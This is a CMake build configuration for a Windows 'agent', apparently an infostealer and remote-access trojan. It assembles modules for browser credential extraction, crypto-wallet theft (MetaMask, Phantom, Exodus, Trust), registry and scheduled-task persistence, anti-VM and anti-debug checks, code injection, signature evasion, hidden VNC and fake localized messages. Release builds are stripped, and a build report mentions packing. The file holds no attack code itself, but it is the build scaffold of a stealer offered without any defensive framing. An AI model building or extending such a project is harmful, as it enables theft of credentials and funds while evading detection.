# Agent CMakeLists.txt
cmake_minimum_required(VERSION 3.16)

# Define agent executable
set(AGENT_NAME rt_srt_agent)

# Core source files (implemented)
set(CORE_SOURCES
    src/main.cpp
    src/logger/file_logger.cpp
    src/logger/encrypt_logger.cpp
    src/integration.cpp
    src/utils.cpp
)

# Browser module sources
set(BROWSER_SOURCES
    src/browser/chrome.cpp
    src/browser/firefox.cpp
    src/browser/edge.cpp
    src/browser/wallets.cpp
    src/browser/sqlite_minimal.cpp
    src/browser/chromium_base.cpp
    src/browser/chrome_extractor.cpp
    src/browser/edge_extractor.cpp
)

# Crypto wallet sources
set(CRYPTO_SOURCES
    src/crypto/metamask.cpp
    src/crypto/phantom.cpp
    src/crypto/exodus.cpp
    src/crypto/trust.cpp
)

# Advanced persistence sources
set(PERSISTENCE_SOURCES
    src/persistence/task_scheduler.cpp
    src/persistence/registry.cpp
    src/persistence/advanced_persistence.cpp
)

# Stealth/Anti-analysis sources
set(STEALTH_SOURCES
    src/stealth/anti_vm.cpp
    src/stealth/anti_debug.cpp
    src/stealth/in_memory_loader.cpp
    src/stealth/stealth_system.cpp
    src/stealth/stealth_manager.cpp
    src/stealth/code_injection.cpp
    src/stealth/auto_rotation.cpp
    src/stealth/obfuscation.cpp
    src/stealth/dynamic_obfuscation.cpp
    src/stealth/signature_evasion.cpp
)

# HVNC sources
set(HVNC_SOURCES
    src/hvnc/create_desktop.cpp
    src/hvnc/control_session.cpp
    src/hvnc/hvnc_manager.cpp
)

# Network secure communications sources
set(NETWORK_SOURCES
    src/network/secure_comms.cpp
)

# LocalizedDeception sources
set(DECEPTION_SOURCES
    src/deception/localized_messages.cpp
)

# All module sources
set(MODULE_SOURCES 
    ${BROWSER_SOURCES}
    ${CRYPTO_SOURCES}
    ${PERSISTENCE_SOURCES}
    ${STEALTH_SOURCES}
    ${HVNC_SOURCES}
    ${NETWORK_SOURCES}
    ${DECEPTION_SOURCES}
)

# Build options
option(BUILD_AS_EXE "Build agent as EXE instead of DLL" OFF)
option(ENABLE_BROWSER_MODULE "Enable browser data extraction" ON)
option(ENABLE_CRYPTO_MODULE "Enable crypto wallet extraction" ON)
option(ENABLE_PERSISTENCE_MODULE "Enable persistence mechanisms" ON)
option(ENABLE_STEALTH_MODULE "Enable anti-analysis features" ON)
option(ENABLE_HVNC_MODULE "Enable Hidden VNC" ON)
option(ENABLE_NETWORK_MODULE "Enable secure network communications" ON)
option(ENABLE_DECEPTION_MODULE "Enable localized fake messages" ON)
option(ENABLE_ADVANCED_LOGGING "Enable advanced encrypted logging" ON)

# Configure modules based on options
set(ACTIVE_SOURCES ${CORE_SOURCES})

if(ENABLE_BROWSER_MODULE)
    list(APPEND ACTIVE_SOURCES ${BROWSER_SOURCES})
endif()

if(ENABLE_CRYPTO_MODULE)
    list(APPEND ACTIVE_SOURCES ${CRYPTO_SOURCES})
endif()

if(ENABLE_PERSISTENCE_MODULE)
    list(APPEND ACTIVE_SOURCES ${PERSISTENCE_SOURCES})
endif()

if(ENABLE_STEALTH_MODULE)
    list(APPEND ACTIVE_SOURCES ${STEALTH_SOURCES})
endif()

if(ENABLE_HVNC_MODULE)
    list(APPEND ACTIVE_SOURCES ${HVNC_SOURCES})
endif()

if(ENABLE_NETWORK_MODULE)
    list(APPEND ACTIVE_SOURCES ${NETWORK_SOURCES})
endif()

if(ENABLE_DECEPTION_MODULE)
    list(APPEND ACTIVE_SOURCES ${DECEPTION_SOURCES})
endif()

if(BUILD_AS_EXE)
    add_executable(${AGENT_NAME} ${ACTIVE_SOURCES})
    target_compile_definitions(${AGENT_NAME} PRIVATE BUILD_AS_EXE)
else()
    add_library(${AGENT_NAME} SHARED ${ACTIVE_SOURCES})
endif()

# Include directories
target_include_directories(${AGENT_NAME} PRIVATE
    ${CMAKE_CURRENT_SOURCE_DIR}/src
    ${CMAKE_CURRENT_SOURCE_DIR}/include
    ${CMAKE_CURRENT_SOURCE_DIR}/src/browser
    ${CMAKE_CURRENT_SOURCE_DIR}/src/crypto
    ${CMAKE_CURRENT_SOURCE_DIR}/src/persistence
    ${CMAKE_CURRENT_SOURCE_DIR}/src/stealth
    ${CMAKE_CURRENT_SOURCE_DIR}/src/hvnc
    ${CMAKE_CURRENT_SOURCE_DIR}/src/network
    ${CMAKE_CURRENT_SOURCE_DIR}/src/deception
    ${CMAKE_CURRENT_SOURCE_DIR}/src/logger
)

# Module-specific compile definitions
if(ENABLE_BROWSER_MODULE)
    target_compile_definitions(${AGENT_NAME} PRIVATE MODULE_BROWSER_ENABLED)
endif()

if(ENABLE_CRYPTO_MODULE)
    target_compile_definitions(${AGENT_NAME} PRIVATE MODULE_CRYPTO_ENABLED)
endif()

if(ENABLE_PERSISTENCE_MODULE)
    target_compile_definitions(${AGENT_NAME} PRIVATE MODULE_PERSISTENCE_ENABLED)
endif()

if(ENABLE_STEALTH_MODULE)
    target_compile_definitions(${AGENT_NAME} PRIVATE MODULE_STEALTH_ENABLED)
endif()

if(ENABLE_HVNC_MODULE)
    target_compile_definitions(${AGENT_NAME} PRIVATE MODULE_HVNC_ENABLED)
endif()

if(ENABLE_NETWORK_MODULE)
    target_compile_definitions(${AGENT_NAME} PRIVATE MODULE_NETWORK_ENABLED)
endif()

if(ENABLE_DECEPTION_MODULE)
    target_compile_definitions(${AGENT_NAME} PRIVATE MODULE_DECEPTION_ENABLED)
endif()

if(ENABLE_ADVANCED_LOGGING)
    target_compile_definitions(${AGENT_NAME} PRIVATE ADVANCED_LOGGING_ENABLED)
endif()

# Platform-specific settings
if(WIN32)
    # Windows-specific compile definitions
    target_compile_definitions(${AGENT_NAME} PRIVATE
        WIN32_LEAN_AND_MEAN
        _WIN32_WINNT=0x0601  # Windows 7 minimum
        UNICODE
        _UNICODE
        NOMINMAX             # Prevent min/max macros
        _CRT_SECURE_NO_WARNINGS
        _WINSOCK_DEPRECATED_NO_WARNINGS
        SECURITY_WIN32
        _SILENCE_ALL_CXX17_DEPRECATION_WARNINGS
        # Advanced Persistence definitions
        PERSISTENCE_ADVANCED
        CRYPTO_ENABLED
        STEALTH_ENABLED
    )
    
    # Windows libraries
    target_link_libraries(${AGENT_NAME} PRIVATE
        # Core Windows libraries
        kernel32
        user32
        shell32
        advapi32
        ntdll
        
        # Cryptography libraries
        crypt32
        bcrypt
        
        # OpenSSL libraries (for secure communications)
        # Note: These need to be available on the system
        # ssl
        # crypto
        
        # Network libraries
        ws2_32
        wininet
        winhttp
        iphlpapi
        
        # Shell and file system
        shlwapi
        
        # COM libraries
        ole32
        oleaut32
        uuid
        # comsupp  # Not available in MinGW - commented out
        
        # Process and debugging
        psapi
        dbghelp
        
        # Registry and security
        secur32
        netapi32
    )
    
    # Additional libraries for MSVC only
    if(MSVC)
        target_link_libraries(${AGENT_NAME} PRIVATE
            # Task Scheduler (MSVC only)
            taskschd
            # WMI libraries
            wbemuuid
        )
    endif()
    
    # Set subsystem
    if(MSVC)
        if(BUILD_AS_EXE)
            set_target_properties(${AGENT_NAME} PROPERTIES
                LINK_FLAGS "/SUBSYSTEM:WINDOWS /ENTRY:WinMainCRTStartup"
            )
        else()
            set_target_properties(${AGENT_NAME} PROPERTIES
                LINK_FLAGS "/SUBSYSTEM:WINDOWS /DLL"
            )
        endif()
    else()
        # MinGW flags
        if(BUILD_AS_EXE)
            set_target_properties(${AGENT_NAME} PROPERTIES
                LINK_FLAGS "-Wl,--subsystem,windows"
            )
        else()
            set_target_properties(${AGENT_NAME} PROPERTIES
                LINK_FLAGS "-Wl,--subsystem,windows"
            )
        endif()
    endif()
else()
    # RT-SRT requires Windows platform for full functionality
    message(FATAL_ERROR "RT-SRT agent can only be built on Windows platform. Current platform: ${CMAKE_SYSTEM_NAME}")
endif()

# Optimization settings
if(MSVC)
    target_compile_options(${AGENT_NAME} PRIVATE
        /W4           # Warning level 4
        /WX-          # Don't treat warnings as errors
        /Oi           # Enable intrinsic functions
        /Oy           # Omit frame pointers
        /GF           # String pooling
        /Gy           # Function-level linking
        /EHsc         # Enable C++ exceptions
        /GR-          # Disable RTTI
    )
    
    # Release optimizations
    if(CMAKE_BUILD_TYPE STREQUAL "Release")
        target_compile_options(${AGENT_NAME} PRIVATE
            /O1       # Optimize for size
            /Os       # Favor small code
            /Ob2      # Inline expansion
            /GL       # Whole program optimization
        )
        
        set_target_properties(${AGENT_NAME} PROPERTIES
            LINK_FLAGS "${CMAKE_EXE_LINKER_FLAGS} /LTCG"
        )
    endif()
else()
    target_compile_options(${AGENT_NAME} PRIVATE
        -Wall
        -Wextra
        -Wpedantic
        -Wno-unused-parameter
        -fvisibility=hidden
        -fvisibility-inlines-hidden
        -fexceptions
        -fno-rtti
    )
    
    if(CMAKE_BUILD_TYPE STREQUAL "Release")
        target_compile_options(${AGENT_NAME} PRIVATE
            -Os
            -ffunction-sections
            -fdata-sections
            -flto
        )
        
        set_target_properties(${AGENT_NAME} PROPERTIES
            LINK_FLAGS "-Wl,--gc-sections -Wl,--strip-all -flto"
        )
    endif()
endif()

# Strip debug info in Release
if(CMAKE_BUILD_TYPE STREQUAL "Release")
    if(MSVC)
        set_target_properties(${AGENT_NAME} PROPERTIES
            LINK_FLAGS "${CMAKE_EXE_LINKER_FLAGS} /DEBUG:NONE"
        )
    else()
        add_custom_command(TARGET ${AGENT_NAME} POST_BUILD
            COMMAND ${CMAKE_STRIP} $<TARGET_FILE:${AGENT_NAME}>
        )
    endif()
endif()

# Build information and size optimization
add_custom_command(TARGET ${AGENT_NAME} POST_BUILD
    COMMAND ${CMAKE_COMMAND} -E echo "============= RT-SRT Agent Build Report ============="
    COMMAND ${CMAKE_COMMAND} -E echo "Target: ${AGENT_NAME}"
    COMMAND ${CMAKE_COMMAND} -E echo "Build Type: ${CMAKE_BUILD_TYPE}"
    COMMAND ${CMAKE_COMMAND} -E echo "Enabled Modules:"
    COMMAND ${CMAKE_COMMAND} -E echo "  Browser Module: ${ENABLE_BROWSER_MODULE}"
    COMMAND ${CMAKE_COMMAND} -E echo "  Crypto Module: ${ENABLE_CRYPTO_MODULE}"
    COMMAND ${CMAKE_COMMAND} -E echo "  Persistence Module: ${ENABLE_PERSISTENCE_MODULE}"
    COMMAND ${CMAKE_COMMAND} -E echo "  Stealth Module: ${ENABLE_STEALTH_MODULE}"
    COMMAND ${CMAKE_COMMAND} -E echo "  HVNC Module: ${ENABLE_HVNC_MODULE}"
    COMMAND ${CMAKE_COMMAND} -E echo "  Network Module: ${ENABLE_NETWORK_MODULE}"
    COMMAND ${CMAKE_COMMAND} -E echo "  Deception Module: ${ENABLE_DECEPTION_MODULE}"
    COMMAND ${CMAKE_COMMAND} -E echo "  Advanced Logging: ${ENABLE_ADVANCED_LOGGING}"
    COMMAND ${CMAKE_COMMAND} -E echo "Agent size before packing:"
    COMMAND ${CMAKE_COMMAND} -E echo "Agent binary: $<TARGET_FILE:${AGENT_NAME}>"
    COMMAND ${CMAKE_COMMAND} -E echo "==================================================="
)

# Create stub files if they don't exist (for initial compilation)
foreach(source_file ${MODULE_SOURCES})
    if(NOT EXISTS ${CMAKE_CURRENT_SOURCE_DIR}/${source_file})
        file(WRITE ${CMAKE_CURRENT_SOURCE_DIR}/${source_file} 
            "// Stub file for ${source_file}\n// TODO: Implement\n\n#include \"../common.h\"\n")
    endif()
endforeach()

# Export compile commands for development
set(CMAKE_EXPORT_COMPILE_COMMANDS ON)